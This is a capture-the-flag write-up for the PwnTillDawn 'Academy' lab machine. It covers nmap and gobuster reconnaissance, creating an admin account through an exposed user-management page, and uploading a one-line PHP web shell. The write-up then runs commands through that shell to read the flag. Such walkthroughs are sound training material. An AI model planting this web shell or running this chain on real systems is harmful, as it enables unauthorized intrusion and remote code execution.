# Pwntilldawn-Academy

**Summary**

| Phase                     | Action                         | Outcome                              |
|--------------------------|--------------------------------|--------------------------------------|
| Reconnaissance           | `Nmap` scan                    | Identified multiple open ports       |
| Scanning & Enumeration   | `Gobuster`, service enum       | Found `/upload` & `/admin`           |
| Gaining Access           | Created admin user             | Full admin panel access              |
| Exploitation             | File upload + web shell        | Remote Command Execution             |
| Post-Exploitation        | System enumeration             | Found sensitive directories          |
| Privilege Access         | Read **FLAG1**                 | Retrieved flag successfully          |

## **1. Reconnaissance (Information Gathering)**

**Objective:** Identify target surface and exposed services.

Always start with nmap to scan for open port and services.
```nmap -sC -sV -Pn -vv 10.150.150.11```
<img width="522" height="462" alt="Screenshot 2026-04-16 095907" src="https://github.com/user-attachments/assets/e981ff1c-8b36-4cac-898a-2ec1c389aff2" />

| Service | Port | What can be done (commands / next step) | Findings |
|--------|------|------------------------------------------|----------|
| FTP | 21 | `ftp 10.150.150.11` → try anonymous login (`anonymous:anonymous`) | failed |
|  |  | `nmap -p21 --script ftp-anon,ftp-syst 10.150.150.11` | nothing |
| HTTP | 80 | Open in browser: `http://10.150.150.11` |  |
|  |  | `gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt` | Lead to full list of directory |

## **2. Scanning & Enumeration**

**Objective:** Extract deeper information from identified services.

### Web Enumeration

**Gobuster**

```
 gobuster dir -u [http://10.150.150.11](http://10.150.150.11/) -w /usr/share/wordlists/dirb/common.txt
```
<img width="773" height="519" alt="Screenshot 2026-04-16 100601" src="https://github.com/user-attachments/assets/35c42290-f854-458a-ae0d-1f60b68813cc" />

### Discovered:

- `/upload`

<img width="708" height="338" alt="Screenshot 2026-04-16 103725" src="https://github.com/user-attachments/assets/840be3d7-33c1-4df4-b31d-3b84a675184c" />

The exposed `/upload` directory with directory indexing enabled suggests improper access control. 
If file uploads are permitted, this could lead to arbitrary file upload, enabling an attacker to upload a malicious payload (e.g., PHP web shell) and achieve remote code execution.

`/admin

<img width="706" height="348" alt="Screenshot 2026-04-16 103258" src="https://github.com/user-attachments/assets/33d8923b-112b-4027-8af4-fac2f2c35a40" />

```latex
http://10.150.150.11/admin/addedituser.php
```
<img width="912" height="585" alt="Screenshot 2026-04-16 103715" src="https://github.com/user-attachments/assets/a958c1ba-ffb8-4e9e-8b95-f35c62119fdc" />

### Findings:

- `/upload` → directory indexing enabled
- `/admin/addedituser.php` → user management exposed

## **3. Gaining Access (Exploitation)**

**Objective:** Exploit vulnerabilities to gain initial foothold.

### Vulnerability Identified:

- **Improper Access Control**
- Ability to:
    - Access admin panel
    - Create new users
    - Assign admin role (Full administrative access to web panel)
 
Add **admin1:admin** with **role:admin**

<img width="912" height="585" alt="Screenshot 2026-04-16 103715" src="https://github.com/user-attachments/assets/c4c23b47-37c0-42e1-a4c8-8fae3afc7e03" />

Then login

<img width="962" height="679" alt="Screenshot 2026-04-16 103859" src="https://github.com/user-attachments/assets/935d838d-f7a4-4032-82ee-98dd9e185867" />

### Next Exploit: File Upload Vulnerability

- Upload functionality available
- No validation on file type

➡️ Uploaded malicious PHP file (web shell attempt)

Create a simple webshell to run commands through the browser. <?php system($_GET['cmd']); ?> save it as "rshell.php" Afterward, upload it to your accounts.

<img width="900" height="471" alt="Screenshot 2026-04-16 104736" src="https://github.com/user-attachments/assets/b0640db9-b588-4eb1-aaeb-5643cdb240b0" />

Force uploading the files into the new folder of http://10.150.150.11/upload/12 Reason to run the PHP file on the web. http://10.150.150.11/upload/12/shell.php http://10.150.150.11/upload/12/shell.php?cmd=hostname

<img width="782" height="241" alt="Screenshot 2026-04-16 105717" src="https://github.com/user-attachments/assets/b5850a76-87ee-4e6a-8ba2-09eb320e6813" />

```http://10.150.150.11/upload/12/shell.php?cmd=whoami```

And because it's window then use ```http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users```

<img width="1008" height="370" alt="Screenshot 2026-04-16 105950" src="https://github.com/user-attachments/assets/a5b6299a-38cf-4d75-892c-2ff7417050a1" />

Find the flag through the directory until found the FLAG file

```http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users\Administrator\Desktop```

<img width="1011" height="299" alt="Screenshot 2026-04-16 110122" src="https://github.com/user-attachments/assets/936b7932-416d-48ea-899f-319c8db47e36" />

after found the flag, change `dir` into `type` to be able to pen a picture type file

<img width="871" height="217" alt="Screenshot 2026-04-16 111918" src="https://github.com/user-attachments/assets/8f02ddd3-47fd-4d31-927f-5704e06c2cc5" />

Then you found th flag.














